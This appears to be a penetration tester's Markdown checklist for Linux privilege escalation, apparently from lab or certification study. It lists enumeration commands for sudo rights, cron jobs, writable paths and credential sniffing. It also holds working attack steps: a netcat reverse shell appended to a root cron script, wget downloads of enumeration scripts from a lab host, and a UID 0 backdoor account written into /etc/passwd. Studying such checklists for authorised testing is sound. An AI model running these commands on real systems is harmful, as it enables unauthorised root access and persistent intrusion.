
# Windows Linux initial checks


- [ ] Check directory that a shell was spawned into
- [ ] List sudo commands that can be executed and check **ALL** in [GTFOBins](https://gtfobins.github.io/)
```
sudo -l
```
- [ ] Search capabilities and check all in [GTFOBins](https://gtfobins.github.io/)
```
/usr/sbin/getcap -r / 2>/dev/null
```
- [ ] Get Users[[_ad]]
```
cat /etc/passwd
```
- [ ] Get Information for potential kernel exploits
```
cat /etc/issue;
cat /etc/os-realease;
cat /etc/*-release;
uname -r;
arch
```
 - [ ] List processes
```c
ps aux
```
- [ ] List network interfaces and routing tables
```c
ip a
route
netstat # or ss -anp
cat /etc/iptables/rules.v4

# with root privs
sudo iptables -L
/etc/iptables # if iptables-persistent package
```
- [ ] Enum linux based job scheduler
```c
ls -lah /etc/cron*
```
- [ ] Enum carefully for insecure file perms
```c
/etc/crontab
```
- [ ] List crontab
```c
crontab -l
```
- [ ] Find all writeable paths
```c
find / -writable -type d 2>/dev/null
```
- [ ] Find all executable paths
```c
find / -perm -o x -type d 2>/dev/null
```
- [ ] Find all writeable and executable paths
```c
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```
- [ ] List all drives mounted at boot time
```c
cat /etc/fstab
```
- [ ] Get Users
```c
cat /etc/passwd
```
- [ ] Check locations for user installed software
```
# Common locations for user installed software
ls -lah /usr/local/;
ls -lah /usr/local/src;
ls -lah /usr/local/bin;
ls -lah /opt/;
ls -lah /home;
ls -lah /var/;
ls -lah /usr/src/;

# Debian
dpkg -l;

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE );

# OpenBSD, FreeBSD
pkg_info;
```
- [ ] Check services from the inside and compare with nmap output
```
netstat -anlp;
netstat -ano
```
- [ ] Check cron jobs
```
grep "CRON" /var/log/syslog

# Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh) - this cron job runs a script as root

cat /home/joe/.scripts/user_backups.sh # what does it do
ls -lah /home/joe/.scripts/user_backups.sh # what are the perms
```
- [ ] Monitor processes that contain the word "pass"
```
watch -n 1 "ps -aux | grep pass"
```
- [ ] Monitor processes that contain the word "pass"
```
sudo tcpdump -i lo -A | grep "pass"
```

### Automated enumeration

- [ ] Unix-privesc-check
```
wget http://192.168.45.xx/unix-privesc-check
./unix-privesc-check standard > unix-privesc-check.txt
```
- [ ] LinEnum
```
wget http://192.168.45.xx/LinEnum.sh
./LinEnum.sh -s -k keyword -r linenum.txt -e /tmp/ -t
./LinEnum.sh -t -k password
```
- [ ] Linpeas (might need to fix a line of code)
```
wget http://192.168.45.xx/linpeas.sh
./Linpeas.sh > linpeas.txt
```
- [ ] linprivchecker.py (idk about auto exploit so only use at the end)

### Get proof.txt and local.txt
- [ ] Search from root dir
```
sudo find / -name "proof.txt" 2>/dev/null;
sudo find / -name "local.txt" 2>/dev/null
```

# Exploits

## Abusing Cron Jobs
- [ ] Double check permissions
```
ls -lah /path/to/script.sh
```
- [ ] Write reverse shell
```
cd .scripts
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.211 1234 >/tmp/f" >> /path/to/script.sh
nc -lnvp 1234
```

## GTFOBins
- [ ] If doesn't work, check why
```
cat /var/log/syslog | grep tcpdump
```

## Searching for kernel exploits

- [ ] Searchsploit query
```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```
## Write to /etc/passwd

- [ ] Generate password hash
```
openssl passwd w00t
```
- [ ] Add new hash to `/etc/passwd` that executes `/bin/bash` as root
```
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
- [ ] Login as root2 with password `w00t`
```
su root2
```

### World writeable directories
```
/tmp
/var/tmp
/dev/shm
/var/spool/vbox
/var/spool/samba
```